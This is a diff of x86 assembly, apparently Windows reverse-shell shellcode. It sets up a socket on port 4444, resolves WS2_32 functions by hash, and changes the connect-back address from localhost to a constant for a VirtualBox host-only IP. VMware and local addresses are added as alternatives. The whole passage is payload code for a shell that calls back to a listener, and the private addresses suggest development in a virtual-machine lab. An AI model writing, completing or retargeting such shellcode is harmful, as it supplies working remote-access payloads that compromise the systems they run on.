@@ -141,7 +141,11 @@ lea     esi, [ebp + server]             ; ESI = ptr to SOCKADDR_IN (Variable loc
 xor     eax, eax
 mov     word [esi], 0x2                 ; sin_family = AF_INET
 mov     word [esi + 0x2], 0x5C11        ; sin_port = 4444 (network byte order [big endian])
-mov     dword [esi + 0x4], 0x0100007F   ; sin_addr = 127.0.0.1 (network byte order [big endian])
+
+; mov     dword [esi + 0x4], 0x0100007F   ; sin_addr = 127.0.0.1 (network byte order [big endian])
+mov     ecx, [edx + IP_VBOX]
+mov     dword [esi + 0x4], ecx
+
 mov     dword [esi + 0x8], eax          ; sin_zero (primeros 4 bytes)
 mov     dword [esi + 0xC], eax          ; sin_zero (ultimos 4 bytes)
 
@@ -258,3 +262,14 @@ WS2_32_DEF_HASHES:
     dd 0x939d7d9c   ; closesocket:
     dd 0xedd8fe8a   ; connect:
     dd 0xFFFFFFFF
+
+
+
+IP_LOCAL:
+    dd 0x0100007F   ; 127.0.0.1:
+
+IP_VBOX:
+    dd 0x013AA8C0   ; 192.168.58.1:
+
+IP_VMWARE:
+    dd 0x012910AC   ; 172.16.41.1:
